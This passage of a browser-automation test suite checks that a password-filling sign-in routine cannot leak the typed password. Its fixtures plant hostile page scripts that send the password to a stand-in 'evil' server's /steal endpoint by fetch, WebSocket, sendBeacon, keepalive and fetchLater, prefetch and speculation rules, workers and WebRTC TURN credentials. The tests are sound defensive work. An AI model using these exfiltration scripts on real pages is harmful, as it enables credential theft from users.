        // No one text node holds it, but the root's text content, which a custom element reads once scripts run, does.
        [
            "split over text nodes in a closed shadow root",
            (echoed: string) => `<div><template shadowrootmode="closed"><p>Signed in with ${echoed.slice(0, 3)}<!---->${echoed.slice(3)}</p></template></div>`,
        ],
        [
            "split over elements in a closed shadow root",
            (echoed: string) =>
                `<div><template shadowrootmode="closed"><p>Signed in with ${echoed.slice(0, 3)}<b>${echoed.slice(3, 6)}</b>${echoed.slice(6)}</p></template></div>`,
        ],
    ])("hands the session on from a blank tab, running none of the answer's script, when the answer shows the password %s", async (_where, shown) => {
        let echoed = "";

        fixture.page = loginForm();
        fixture.onSession = (_request, response, body) => {
            echoed = new URLSearchParams(body).get("pw") ?? "";
            response.writeHead(303, { location: "/home" });
            response.end();
        };
        // The site renders what it was sent, as a page could from its own records.
        Object.defineProperty(fixture, "home", {
            configurable: true,
            get: () => `${shown(echoed)}<script>fetch("${evil.origin}/steal", { body: document.body.textContent, method: "POST", mode: "no-cors" });</script>`,
        });

        const result = await run();

        Reflect.deleteProperty(fixture, "home");

        // Nothing of the answer outlives it: a password the site's own markup happens to hold costs no session.
        expect(result).toMatchObject({ submitted: true, success: true });
        expect(page.url()).toBe("about:blank");
        expect(login.hits.filter((hit) => hit.url === "/home")).toHaveLength(1);
        expect(evil.hits).toStrictEqual([]);
    });

    it("closes the session when the answer sets a cookie a script could read with the password in it", async () => {
        fixture.page = loginForm();
        fixture.onSession = (_request, response, body) => {
            response.writeHead(303, { location: "/home", "set-cookie": `last=${encodeURIComponent(new URLSearchParams(body).get("pw") ?? "")}; Path=/` });
            response.end();
        };

        const result = await run();

        expect(result).toMatchObject({ sessionClosed: true, submitted: true, success: false });
        expect(page.isClosed()).toBe(true);
    });

    it.each([
        ["the form is sent", "", 303],
        // Refused: no answer replaces the page, whose address and title are still its own.
        ["the page makes its form be refused", `const field = document.forms[0].pw; field.value = [...field.value].reverse().join("");`, 303],
        // Sent, but answered with no page: the tab keeps the page's own document.
        ["the site answers with no page", "", 204],
    ])(
        "shows the page, its site and the result the same sign-in whether a guess it planted is the password or not, when %s",
        async (_when, refusal, status) => {
            // A guess in the page's cookies, storage, address and title before the form is sent, a probe on a timer, and the
            // answer's own script: everything the page, its site or the result could show of the cleanup is recorded.
            const observed = async (guess: string) => {
                await context.close();
                context = await browser.newContext();
                page = await context.newPage();
                login.hits.length = 0;
                fixture.page = loginForm(
                    `document.forms[0].addEventListener("submit", () => {
                    ${refusal}
                    document.cookie = "guess=${guess}; path=/";
                    localStorage.setItem("guess", "${guess}");
                    history.replaceState(null, "", "/?guess=${guess}");
                    document.title = "${guess}";
                    setInterval(() => fetch("/probe?tick").catch(() => undefined), 5);
                });`,
                );
                fixture.home = `<h1>Home</h1><script>fetch("/ran");</script>`;
                fixture.onSession = (_request, response) => {
                    response.writeHead(status, status === 303 ? { location: "/home" } : {});
                    response.end();
                };

                const result = await run();
                const seen = login.hits.filter((hit) => hit.url !== "/probe?tick").map(({ method, url }) => `${method} ${url.replace(guess, "GUESS")}`);

                return { result: JSON.stringify(result).replaceAll(guess, "GUESS"), seen };
            };

            const right = await observed(SAVED_SECRET);
            const wrong = await observed("wrong-guess");

            expect(right).toStrictEqual(wrong);
            const sent = status === 204 ? ["GET /", "POST /session"] : ["GET /", "POST /session", "GET /home"];

            expect(wrong.seen).toStrictEqual(refusal ? ["GET /"] : sent);
            expect(wrong.result).not.toContain("withheld");
        },
    );

    it("types nothing into a form in a charset other than UTF-8, whatever the password", async () => {
        fixture.page = `<meta charset="windows-1252">${loginForm()}`;

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("encodes what it sends"), submitted: false, success: false });
        expect(sessionPosts()).toStrictEqual([]);
    });

    it("keeps a cross-site frame paused, and closes the session, when its lock is not confirmed", async () => {
        const { newCDPSession } = context;

        // Each lock script sent into a child session fails there.
        context.newCDPSession = async (...args) => {
            const session = await newCDPSession.apply(context, args);
            const { send } = session;

            session.send = (async (method: string, params?: Parameters<typeof send>[1]) => {
                const message = (params as { message?: string } | undefined)?.message;

                return method === "Target.sendMessageToTarget" && message?.includes("Page.addScriptToEvaluateOnNewDocument")
                    ? send.call(
                          session,
                          method as never,
                          { ...params, message: message.replace("Page.addScriptToEvaluateOnNewDocument", "Page.noSuchCommand") } as never,
                      )
                    : send.call(session, method as never, params as never);
            }) as typeof send;

            return session;
        };
        fixture.evil = `<script>fetch("/ran");</script>`;
        fixture.page = `<iframe src="${evil.origin}/relay"></iframe>${loginForm()}`;

        const result = await run();

        // Typed or not, depending on when the frame attached: either way the frame never ran, and the session is closed.
        expect(result).toMatchObject({ error: expect.stringContaining("could not be locked"), sessionClosed: true, success: false });
        expect(page.isClosed()).toBe(true);
        expect(evil.hits.map((hit) => hit.url)).toStrictEqual(["/relay"]);
    });

    it.each([
        ["points the form at another address of the site", `document.forms[0].action = "/profile";`],
        ["renames the password field", `document.forms[0].pw.name = "bio";`],
        ["adds a key to the form's query", `document.forms[0].action += "&next=home";`],
        ["removes a key from the form's query", `document.forms[0].action = "/session?session_code=PER_LOAD";`],
        ["keeps the query but changes the path", `document.forms[0].action = "/profile?session_code=PER_LOAD&client_id=app";`],
        ["swaps the per-load code for one of its own", `document.forms[0].action = "/session?session_code=Zp3cD8yW1nR50000&client_id=app";`],
        ["swaps the code's key for another", `document.forms[0].action = "/session?tenant=PER_LOAD&client_id=app";`],
        ["points the form's submit button elsewhere", `document.forms[0].querySelector("button").formAction = "/profile?session_code=PER_LOAD&client_id=app";`],
        ["changes how the form is encoded", `document.forms[0].enctype = "multipart/form-data";`],

        [
            "changes a value of the query to an address",
            `document.forms[0].action = "/session?session_code=" + encodeURIComponent("https://x.example/") + "&client_id=app";`,
        ],
    ])("types nothing when a script of the page %s before it is filled", async (_what, script) => {
        fixture.page = loginForm(script, 'method="post" action="/session?session_code=PER_LOAD&client_id=app"');

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("A script changed where"), submitted: false, success: false });
        expect(await leftBlank()).toBe(true);
    });

    it("types nothing when a script hides the login form so that another form the site sent is filled", async () => {
        fixture.page = `${loginForm()}<form method="post" action="/profile"><input name="user"><input name="pw" type="password"><button>Save</button></form><script>document.forms[0].hidden = true;</script>`;

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("A script changed where"), submitted: false, success: false });
        expect(login.hits.filter((hit) => hit.method === "POST")).toStrictEqual([]);
    });

    it("types nothing when a script moves the tab to another page of the site with a form of its own", async () => {
        fixture.page = loginForm(`location.replace("/popup");`);
        fixture.popup = `<form method="post" action="/profile"><input name="user"><input name="pw" type="password"><button>Save</button></form>`;

        const result = await run();

        expect(result).toMatchObject({ submitted: false, success: false });
        expect(login.hits.filter((hit) => hit.method === "POST")).toStrictEqual([]);
    });

    it("types the username into the last field before the password that takes typing, past a disabled one, one in a disabled fieldset or a read-only one", async () => {
        fixture.page = `<form method="post" action="/session"><input name="user"><input name="code" value="x" disabled><fieldset disabled><input name="team" value="z"></fieldset><input name="hint" value="y" readonly><input name="pw" type="password"><button>Go</button></form>`;

        const result = await run();

        expect(result).toMatchObject({ submitted: true, success: true });
        expect(sessionPosts()).toStrictEqual([{ body: `user=ann&hint=y&pw=${SAVED_SECRET}`, method: "POST", url: "/session" }]);
    });

    it("sends nothing once the caller's hold on the session is lost, whatever step the sign-in is at", async () => {
        fixture.page = loginForm();
        let looks = 0;

        const result = await signIn(page as unknown as WorkerPage, {
            deadline: Date.now() + 30_000,
            // Lost a few steps in: after the page loaded, before the send.
            isStopped: () => {
                looks += 1;

                return looks > 3;
            },
            navTimeout: 10_000,
            origin: login.origin,
            pageTimeout: 5000,
            password: SAVED_SECRET,
            url: `${login.origin}/`,
            username: "ann",
        });

        expect(result).toMatchObject({ error: expect.stringContaining("The hold on the browser session was lost"), submitted: false, success: false });
        expect(sessionPosts()).toStrictEqual([]);
        expect(await passwordLeft()).toBe(false);
    });

    it("does not hand on the form's POST once the caller's hold is lost as it leaves", async () => {
        fixture.page = loginForm();
        let isLost = false;

        page.on("request", (request) => {
            isLost ||= request.method() === "POST";
        });

        const result = await signIn(page as unknown as WorkerPage, {
            deadline: Date.now() + 30_000,
            isStopped: () => isLost,
            navTimeout: 10_000,
            origin: login.origin,
            pageTimeout: 5000,
            password: SAVED_SECRET,
            url: `${login.origin}/`,
            username: "ann",
        });

        // The POST did leave the page: the hold was lost as it went, and the check before its hand-on stopped it.
        expect(isLost).toBe(true);
        expect(result).toMatchObject({ submitted: false, success: false });
        expect(sessionPosts()).toStrictEqual([]);
    });

    it("closes the page and the session when the page's loader cannot be let go of after the page failed to load", async () => {
        fixture.page = loginForm();
        fixture.onMoved = (response) => {
            response.destroy();
        };
        const { newCDPSession } = context;

        // The loader's DevTools session (the one that turns the cache off) never lets go; every other one does.
        context.newCDPSession = async (...args) => {
            const session = await newCDPSession.apply(context, args);
            const { detach, send } = session;
            let isLoader = false;

            session.send = (async (method: string, params?: Parameters<typeof send>[1]) => {
                isLoader ||= method === "Network.setCacheDisabled";

                return send.call(session, method as never, params as never);
            }) as typeof send;
            session.detach = async () => (isLoader ? NEVER : detach.call(session));

            return session;
        };

        const result = await signIn(page as unknown as WorkerPage, {
            deadline: Date.now() + 30_000,
            navTimeout: 10_000,
            origin: login.origin,
            pageTimeout: 5000,
            password: SAVED_SECRET,
            url: `${login.origin}/moved.png`,
            username: "ann",
        });

        expect(result).toMatchObject({ sessionClosed: true, submitted: false, success: false });
        expect(page.isClosed()).toBe(true);
    });

    it("takes out a rule set however its type is cased, and leaves a data block whose type only names rules", async () => {
        const probe = `addEventListener("DOMContentLoaded", () => { fetch("/probe?data=" + Boolean(document.getElementById("data")) + "&padded=" + Boolean(document.getElementById("padded")) + "&rules=" + Boolean(document.getElementById("rules"))); });`;

        // Chromium reads a rule set from neither data block: one names rules in a longer type, one pads the type.
        fixture.page = `<script id="data" type="application/speculationrules+json">{}</script><script id="padded" type=" speculationrules ">{}</script><script id="rules" type="SpeculationRules">{}</script>${loginForm(probe)}`;

        await run();

        expect(login.hits.filter((hit) => hit.url.startsWith("/probe")).map((hit) => hit.url)).toStrictEqual(["/probe?data=true&padded=true&rules=false"]);
    });

    it("signs in with a form whose empty action is the page's own address, whatever its base", async () => {
        fixture.page = `<base href="/other/">${loginForm("", 'method="post" action=""')}`;

        const result = await run();

        expect(result).toMatchObject({ submitted: true });
        expect(login.hits.filter((hit) => hit.method === "POST")).toStrictEqual([{ body: `user=ann&pw=${SAVED_SECRET}`, method: "POST", url: "/" }]);
    });

    it("types nothing into a login page another site redirected the tab to", async () => {
        fixture.page = loginForm();

        const result = await run(Date.now, `${evil.origin}/bounce`);

        expect(result).toMatchObject({
            error: expect.stringContaining("cannot check where the login form sends the password"),
            submitted: false,
            success: false,
        });
        expect(sessionPosts()).toStrictEqual([]);
    });

    it.each([
        ["in characters", "x".repeat(2 * 1024 * 1024)],
        // Two bytes each in UTF-8: just over 2 MB, in half as many characters.
        ["in bytes", "é".repeat(1024 * 1024 + 1024)],
    ])("types nothing when the page's HTML as the site sent it is past the 2 MB it is read up to %s", async (_how, filler) => {
        fixture.page = `<meta charset="utf-8">${loginForm()}<!--${filler}-->`;

        const result = await run();

        expect(result).toMatchObject({
            error: expect.stringContaining("cannot check where the login form sends the password"),
            submitted: false,
            success: false,
        });
        expect(await leftBlank()).toBe(true);
    });

    it("signs in when the page's HTML is just under the 2 MB it is read up to in bytes", async () => {
        fixture.page = `<meta charset="utf-8">${loginForm()}<!--${"é".repeat(1024 * 1024 - 1024)}-->`;
        // The page it lands on nests deeper than one read of it goes: the cleanup's look reads on.
        fixture.home = `${"<div>".repeat(200)}<h1>Home</h1>`;

        const result = await run();

        expect(result).toMatchObject({ submitted: true, success: true });
    });

    it("types nothing into a login form a script builds", async () => {
        fixture.page = `<div id="app"></div><script>document.querySelector("#app").innerHTML = ${scriptString(loginForm())};</script>`;

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("built by a script"), submitted: false, success: false });
        expect(await leftBlank()).toBe(true);
    });

    it("does not count a beacon of the whole form as the sign-in", async () => {
        fixture.page = loginForm(
            `document.forms[0].addEventListener("submit", (event) => { event.preventDefault(); navigator.sendBeacon("/beacon", new FormData(document.forms[0])); });`,
        );

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("not sent"), submitted: false, success: false });
    });

    it.each([
        ["to another site", () => `${evil.origin.replace("http", "ws")}/steal?`],
        ["with it in the path to the login's own site", () => `${login.origin.replace("http", "ws")}/socket/`],
    ])("refuses a WebSocket %s while the password is in the page", async (_where, address) => {
        fixture.page = loginForm(
            `document.forms[0].addEventListener("submit", (event) => { event.preventDefault(); new WebSocket("${address()}" + document.forms[0].pw.value); });`,
        );

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("WebSocket"), submitted: false, success: false });
        expect([...evil.hits, ...login.hits].filter((hit) => hit.method === "WEBSOCKET")).toStrictEqual([]);
    });

    it("closes a WebSocket to another site the page opened before the password was typed", async () => {
        fixture.page = loginForm(
            `const socket = new WebSocket("${evil.origin.replace("http", "ws")}/live"); document.forms[0].addEventListener("submit", () => { try { socket.send(document.forms[0].pw.value); } catch {} });`,
        );
        // The page is only filled once its socket is open.
        fixture.page += `<script>document.forms[0].pw.type = "text"; new Promise((resolve) => setTimeout(resolve, 300)).then(() => { document.forms[0].pw.type = "password"; });</script>`;

        const result = await run();

        expect(result).toMatchObject({ submitted: true, success: true });
        expect(evil.hits.map((hit) => hit.method).filter((method) => method !== "FRAME 8")).toStrictEqual(["WEBSOCKET"]);
    });

    /** A worker's script that sends what it is handed to the other site on a WebSocket and by POST. */
    const exfiltrate = (): string =>
        `const send = (data) => { new WebSocket("${evil.origin.replace("http", "ws")}/steal?" + data); fetch("${evil.origin}/steal", { body: data, method: "POST", mode: "no-cors" }); };`;

    /**
     * Kept by an unload handler as it sends, when the password field holds what was typed: it got to the send. In the
     * site's storage, as what an unloading page logs is not reported.
     */
    const unloading = `if (document.forms[0].pw.value) localStorage.setItem("reached", "send on unload");`;
    const sentOnUnload = async (): Promise<boolean> => {
        const { origins } = await context.storageState();

        return origins.some(({ localStorage }) => localStorage.some(({ name }) => name === "reached"));
    };
    /** A login form whose submit handler logs `SUBMITTED`, holds the form back and runs `body` with the field's value as `pw`. */
    const onSubmit = (body: string, before = ""): string =>
        loginForm(
            `${before} document.forms[0].addEventListener("submit", (event) => { event.preventDefault(); console.log("${SUBMITTED}"); const pw = document.forms[0].pw.value; ${body} });`,
        );
    /** Rules that prefetch every link in the document as soon as it is there. */
    const EVERY_LINK = `{"prefetch":[{"eagerness":"immediate","source":"document"}]}`;
    const linkTo = (origin: string): string => `const link = document.createElement("a"); link.href = "${origin}/steal?" + pw; document.body.append(link);`;
    /** A script element of rules that prefetch and prerender an address on `origin` carrying `pw`. */
    const speculationRules = (origin: string): string =>
        `Object.assign(document.createElement("script"), { textContent: JSON.stringify({ prefetch: [{ source: "list", urls: ["${origin}/steal?" + pw] }], prerender: [{ source: "list", urls: ["${origin}/render?" + pw] }] }), type: "speculationrules" })`;
    /** Markup, as a script expression, of a closed declarative shadow root holding rules that prefetch every link, and a link on `origin` carrying `pw`. */
    const closedRules = (origin: string): string =>
        `'<div><template shadowrootmode="closed"><script type="speculationrules">${EVERY_LINK}</' + 'script></template></div><a href="${origin}/steal?' + encodeURIComponent(pw) + '">x</a>'`;
    const blobWorker = (realm: string): string =>
        `new ${realm}.Worker(${realm}.URL.createObjectURL(new ${realm}.Blob([${scriptString(`${exfiltrate()} onmessage = (event) => send(event.data);`)}]))).postMessage(pw);`;

    it("sees the form's POST past a service worker that would answer it itself", async () => {
        fixture.page = loginForm();
        fixture.worker = `self.addEventListener("activate", (event) => event.waitUntil(clients.claim())); self.addEventListener("fetch", (event) => { if (event.request.method === "POST") event.respondWith(new Response("held")); });`;
        await page.goto(`${login.origin}/`);
        await page.evaluate(async () => {
            await navigator.serviceWorker.register("/worker.js");
            await navigator.serviceWorker.ready;
        });

        const result = await run();

        expect(result).toMatchObject({ submitted: true, success: true, url: `${login.origin}/home` });
        expect(sessionPosts()).toHaveLength(1);
    });

    it.each([
        ["a message", "navigator.serviceWorker.ready.then((registration) => registration.active.postMessage(pw));"],
        ["a broadcast", `new BroadcastChannel("out").postMessage(pw);`],
    ])("gives a service worker no way to the password by %s", async (_how, send) => {
        fixture.page = onSubmit(send);
        fixture.worker = `${exfiltrate()} self.addEventListener("activate", (event) => event.waitUntil(clients.claim())); self.addEventListener("message", (event) => send(event.data)); new BroadcastChannel("out").onmessage = (event) => send(event.data);`;
        await page.goto(`${login.origin}/`);
        await page.evaluate(async () => {
            await navigator.serviceWorker.register("/worker.js");
            await navigator.serviceWorker.ready;
        });

        const result = await run();

        expect(result).toMatchObject({ submitted: false, success: false });
        expect(evil.hits).toStrictEqual([]);
    });

    it.each([
        [
            "a worker started with the page",
            () => {
                return {
                    // Started as the page loads, where the lock refuses it: the page goes on without.
                    page: onSubmit("worker?.postMessage(pw);", `let worker; try { worker = new Worker("/worker.js"); } catch {}`),
                    worker: `${exfiltrate()} onmessage = (event) => send(event.data);`,
                };
            },
        ],
        [
            "a shared worker",
            () => {
                return {
                    page: onSubmit(`new SharedWorker("/worker.js").port.postMessage(pw);`),
                    worker: `${exfiltrate()} onconnect = (event) => { event.ports[0].onmessage = (message) => send(message.data); };`,
                };
            },
        ],
        [
            "a blob worker",
            () => {
                return { page: onSubmit(blobWorker("window")) };
            },
        ],
        [
            "a worker of a blank frame's realm",
            () => {
                return { page: onSubmit(`const frame = document.createElement("iframe"); document.body.append(frame); ${blobWorker("frame.contentWindow")}`) };
            },
        ],
        [
            "a WebSocketStream",
            () => {
                return { page: onSubmit(`new WebSocketStream("${evil.origin.replace("http", "ws")}/steal?" + pw);`) };
            },
        ],
        [
            "fetchLater",
            () => {
                return { page: onSubmit(`fetchLater("${evil.origin}/steal", { activateAfter: 0, body: pw, method: "POST" });`) };
            },
        ],
        [
            "a keepalive fetch as the page unloads",
            () => {
                return {
                    page: loginForm(
                        `addEventListener("pagehide", () => { ${unloading} fetch("${evil.origin}/steal?" + document.forms[0].pw.value, { keepalive: true, mode: "no-cors" }); });`,
                    ),
                };
            },
        ],
        [
            "a keepalive fetch whose options change as they are read",
            () => {
                return {
                    page: loginForm(
                        `let reads = 0; addEventListener("pagehide", () => { ${unloading} fetch("${evil.origin}/steal?" + document.forms[0].pw.value, { get keepalive() { reads += 1; return reads > 1; }, mode: "no-cors" }); });`,
                    ),
                };
            },
        ],
        [
            "a beacon as the page unloads",
            () => {
                return {
                    page: loginForm(
                        `addEventListener("pagehide", () => { ${unloading} navigator.sendBeacon("${evil.origin}/steal", document.forms[0].pw.value); });`,
                    ),
                };
            },
        ],
        [
            "a link prefetch",
            () => {
                return {
                    page: onSubmit(
                        `const link = document.createElement("link"); link.rel = "prefetch"; link.href = "${evil.origin}/steal?" + pw; document.head.append(link);`,
                    ),
                };
            },
        ],
        [
            "document speculation rules in the page, through a link a script adds",
            () => {
                return { page: `<script type="speculationrules">${EVERY_LINK}</script>${onSubmit(linkTo(evil.origin))}` };
            },
        ],
        [
            "document speculation rules from a Speculation-Rules header, through a link a script adds",
            () => {
                return { headers: { "speculation-rules": '"/rules.json"' }, page: onSubmit(linkTo(evil.origin)), rules: EVERY_LINK };
            },
        ],
        [
            "document speculation rules in a declarative shadow root, through a link a script adds",
            () => {
                return {
                    page: `<div><template shadowrootmode="closed"><script type="speculationrules">${EVERY_LINK}</script></template></div>${onSubmit(linkTo(evil.origin))}`,
                    refusal: "speculation rules that cannot be taken out",
                };
            },
        ],
        [
            "speculation rules a script adds",
            () => {
                return { page: onSubmit(`document.head.append(${speculationRules(evil.origin)});`) };
            },
        ],
        [
            "speculation rules whose type a script changes once they are in",
            () => {
                return { page: onSubmit(`const rules = ${speculationRules(evil.origin)}; document.head.append(rules); rules.type = "text/plain";`) };
            },
        ],
        [
            "speculation rules a script writes into the parsed page in a declarative shadow root",
            () => {
                return { page: onSubmit(`document.open(); document.write(${closedRules(evil.origin)}); document.close();`) };
            },
        ],
        [
            "a page of its own markup it opens in the tab, with speculation rules in a declarative shadow root",
            () => {
                return { page: onSubmit(`location.href = URL.createObjectURL(new Blob([${closedRules(evil.origin)}], { type: "text/html" }));`) };
            },
        ],
        [
            "speculation rules in a shadow root a removed frame's realm attached",
            () => {
                return {
                    page: onSubmit(
                        `const frame = document.createElement("iframe"); document.body.append(frame); const host = document.createElement("div"); document.body.append(host); const shadow = frame.contentWindow.Element.prototype.attachShadow.call(host, { mode: "closed" }); frame.remove(); shadow.append(${speculationRules(evil.origin)});`,
                    ),
                };
            },
        ],
        [
            "speculation rules a script adds in a closed shadow root",
            () => {
                return {
                    page: onSubmit(
                        `const host = document.createElement("div"); document.body.append(host); host.attachShadow({ mode: "closed" }).append(${speculationRules(evil.origin)});`,
                    ),
                };
            },
        ],
    ])("gives %s no way out with the password", async (_what, make) => {
        const { refusal, ...fields }: Partial<typeof fixture> & { refusal?: string } = make();

        Object.assign(fixture, fields);

        const result = await run();

        // Each case gets as far as the stand-in typed and the form sent, unless it names the refusal that stops it first.
        expect(result.success ? "" : result.error).toMatch(refusal ?? REACHED_SEND);
        expect(logged.includes(SUBMITTED) || (await sentOnUnload())).toBe(refusal === undefined);
        expect(evil.hits).toStrictEqual([]);
    });

    it("gives a worker of a cross-site frame the page hands the password to no way out", async () => {
        // The frame says it runs, and whether its Worker is the browser's own.
        fixture.evil = `<script>parent.postMessage(String(Function.prototype.toString.call(Worker).includes("native")), "*"); onmessage = (event) => { const pw = event.data; ${blobWorker("window")} };</script>`;
        fixture.page = `<iframe src="${evil.origin}/relay"></iframe>${onSubmit(`frames[0].postMessage(pw, "*");`, `addEventListener("message", (event) => fetch("/alive?native=" + event.data), { once: true });`)}`;

        await run();

        // The first load, under the lock; the cleanup's reload, after it, runs the frame again.
        expect(login.hits.find((hit) => hit.url.startsWith("/alive"))).toStrictEqual({ body: "", method: "GET", url: "/alive?native=false" });
        expect(evil.hits.filter((hit) => hit.url !== "/relay")).toStrictEqual([]);
    });

    const rtc = (from: string): string =>
        `const connection = new ${from}.RTCPeerConnection({ iceServers: [{ credential: "x", urls: "${turn}", username: pw }] }); connection.createDataChannel("out"); connection.createOffer().then((offer) => connection.setLocalDescription(offer));`;

    it.each([
        ["the page", () => rtc("window")],
        ["a blank frame's realm", () => `const frame = document.createElement("iframe"); document.body.append(frame); ${rtc("frame.contentWindow")}`],
        // Each way to call `open`: the window's own (Chromium keeps it on the window, not `Window.prototype`), called on
        // the window, a blank frame's, and `document.open` with three arguments. A window it makes would be a fresh realm.
        ["a window the prototype's open makes", () => rtc(`(Window.prototype.open?.call(window, "") ?? window)`)],
        ["a window open makes, called on the window", () => rtc(`(Function.prototype.call.call(open, window, "") ?? window)`)],
        [
            "a window a blank frame's open makes",
            () => `const frame = document.createElement("iframe"); document.body.append(frame); ${rtc(`(frame.contentWindow.open("") ?? window)`)}`,
        ],
        ["a window document.open makes", () => rtc(`(document.open("", "", "") ?? window)`)],
    ])("refuses WebRTC from %s while the password is in it", async (_where, send) => {
        fixture.page = onSubmit(send());

        const result = await run();

        expect(result.success ? "" : result.error).toMatch(REACHED_SEND);
        expect(logged).toContain(SUBMITTED);
        expect(datagrams).toStrictEqual([]);
    });

    it("closes a window the page opened before the password was typed, before it runs", async () => {
        fixture.popup = `<script>setInterval(() => { const pw = opener.document.forms[0]?.pw.value; if (pw) { ${rtc("window")} } }, 50);</script>`;
        fixture.page = `${loginForm()}<a href="/popup" target="side">side</a><script>document.querySelector("a").click();</script>`;

        await run();

        expect(datagrams).toStrictEqual([]);
        expect(context.pages()).toStrictEqual([page]);
    });

    it("does not send the form when the page re-encodes the password first", async () => {
        fixture.page = loginForm(
            `document.forms[0].addEventListener("submit", () => { const field = document.forms[0].pw; field.value = [...field.value].reverse().join(""); });`,
        );

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("changed the password field"), submitted: false, success: false });
        expect(sessionPosts()).toStrictEqual([]);
    });

    it("stops no address of a page whose form's POST was refused, whatever guess at the password it holds", async () => {
        // Each round sends a right and a wrong guess in one task, until the cleanup turns the scripts off.
        fixture.page = loginForm(
            `document.forms[0].addEventListener("submit", () => {
                const field = document.forms[0].pw;
                field.value = [...field.value].reverse().join("");
                let round = 0;
                setInterval(() => {
                    round += 1;
                    for (const guess of ["${SAVED_SECRET}", "wrong-guess"]) {
                        fetch("/probe?r=" + round + "&g=" + guess).catch(() => undefined);
                    }
                }, 2);
            });`,
        );

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("changed the password field"), submitted: false, success: false });

        // The rounds each guess reached the site in. The cleanup can cut the last round between its two requests: that round
        // is left out, whichever guess it reached with.
        const rounds = (guess: string): number[] =>
            login.hits.flatMap((hit) => {
                const found = PROBE_RE.exec(hit.url);

                return found?.[2] === guess ? [Number(found[1])] : [];
            });
        const last = Math.max(...rounds("wrong-guess"), ...rounds(SAVED_SECRET));
        const before = (guess: string): number[] =>
            rounds(guess)
                .filter((round) => round < last)
                .toSorted((a, b) => a - b);

        expect(before("wrong-guess").length).toBeGreaterThan(0);
        expect(before(SAVED_SECRET)).toStrictEqual(before("wrong-guess"));
    });

    /** The bodies `route.fallback` hands on with the password; `handled` is told of every route handed on or aborted. */
    const forwardedPasswords = async (handled: (route: Route) => void = () => undefined): Promise<string[]> => {
        const forwarded: string[] = [];

        await aroundRoutes({
            abort: handled,
            fallback: async (next, options, route) => {
                const { postData } = options ?? {};

                if ((typeof postData === "string" || Buffer.isBuffer(postData)) && String(postData).includes(SAVED_SECRET)) {
                    forwarded.push(String(postData));
                }

                handled(route);

                return next(options);
            },
        });

        return forwarded;
    };

    it("hands on the form's POST with the password only once when the page submits it again while the first waits", async () => {
        const secondHandled = Promise.withResolvers<void>();
        // The first POST is held until the second is dealt with: the first one dealt with is the second.
        const forwarded = await forwardedPasswords((route) => {
            if (route.request().method() === "POST" && route.request().url().endsWith("/session")) {
                secondHandled.resolve();
            }
        });
        let first: Promise<unknown> = Promise.resolve();

        // The first send's command answers only once the page has submitted the form again and that POST was dealt with.
        scriptsOff(async (call, send) => {
            if (call !== 1) {
                return send();
            }

            first = secondHandled.promise.then(send).catch(() => undefined);

            return first;
        });
        // Again from a later task: one in the same task would replace the first submission before it is sent.
        fixture.page = loginForm(
            `document.forms[0].addEventListener("submit", () => setTimeout(() => HTMLFormElement.prototype.submit.call(document.forms[0]), 100));`,
        );

        await run();
        // The first send's handler goes on once its command answers.
        await first;
        await new Promise(setImmediate);

        expect(forwarded).toHaveLength(1);
    });

    it("does not send a form whose scripts-off command answers only after the sign-in gave up waiting", async () => {
        const forwarded = await forwardedPasswords();
        let offset = 0;
        const cleanupStarted = Promise.withResolvers<void>();
        let first: Promise<unknown> = Promise.resolve();

        // The send's command answers once the cleanup sends its own; meanwhile the wait for the send runs out.
        scriptsOff(async (call, send) => {
            if (call === 1) {
                offset += 6000;
                first = cleanupStarted.promise.then(send).catch(() => undefined);

                return first;
            }

            cleanupStarted.resolve();

            return send();
        });
        fixture.page = loginForm();

        const result = await run(() => Date.now() + offset);

        await first;
        await new Promise(setImmediate);

        expect(result).toMatchObject({ submitted: false, success: false });
        expect(forwarded).toStrictEqual([]);
    });

    it("reports a POST as sent while its hand-on is still pending, and sends it once", async () => {
        let offset = 0;
        const returned = Promise.withResolvers<void>();
        let handedOn = Promise.resolve();

        // The POST goes out at once, but the hand-on returns only after the sign-in ended, the clock past its wait.
        await aroundRoutes({
            fallback: async (next, options, route) => {
                if (options?.postData === undefined) {
                    return next(options);
                }

                offset += 6000;
                handedOn = route.continue(options).then(async () => returned.promise);

                return handedOn;
            },
        });
        fixture.page = loginForm();

        const result = await run(() => Date.now() + offset);

        returned.resolve();
        await handedOn;

        expect(result).toMatchObject({ submitted: true });
        expect(sessionPosts()).toHaveLength(1);
    });

    it("reports a form POST that could not be handed on as not sent", async () => {
        await aroundRoutes({
            fallback: async (next, options) => {
                if (options?.postData !== undefined) {
                    throw new Error("Route is already handled!");
                }

                return next(options);
            },
        });
        fixture.page = loginForm();

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("did not send the login form"), submitted: false, success: false });
        expect(sessionPosts()).toStrictEqual([]);
    });

    it("says the browser could not be locked down, not that the page changed the field, when the scripts cannot be turned off for the send", async () => {
        scriptsOff(async (call, send) => (call === 1 ? Promise.reject(new Error("Target closed")) : send()));
        fixture.page = loginForm();

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("could not be locked down for the send"), submitted: false, success: false });
        expect(sessionPosts()).toStrictEqual([]);
    });

    it("closes the session when turning the scripts off for the cleanup stalls past the hold", async () => {
        // The sign-in's clock stands still but for the jump below: how long the browser takes does not move it.
        const start = Date.now();
        const deadline = start + 30_000;
        let offset = 0;
        let cleanupLeft: number | undefined;

        // The send's command answers; the cleanup's never does. The clock jumps from that command, which the cleanup
        // sends only with time left: a cleanup that ran out of time first would never reach it. The jump lands before the
        // cleanup sets its wait, as the command is sent synchronously inside the shield call.
        scriptsOff(async (call, send, isOff) => {
            // The send's, and the command that turns them back on as the closed page is let go.
            if (call === 1 || !isOff) {
                return send();
            }

            cleanupLeft = deadline - (start + offset);
            offset = deadline - 1300 - start;

            return NEVER;
        });
        fixture.page = loginForm();

        const result = await run(() => start + offset, undefined, deadline);

        // The cleanup reached the command with the whole hold left: none of it was spent before.
        expect(cleanupLeft).toBe(30_000);
        expect(result).toMatchObject({ sessionClosed: true, submitted: true, success: false });
        expect(page.isClosed()).toBe(true);
    });

    it("closes the session rather than navigate with no time limit when the cleanup's lock-down answers right at its end", async () => {
        const deadline = Date.now() + 30_000;
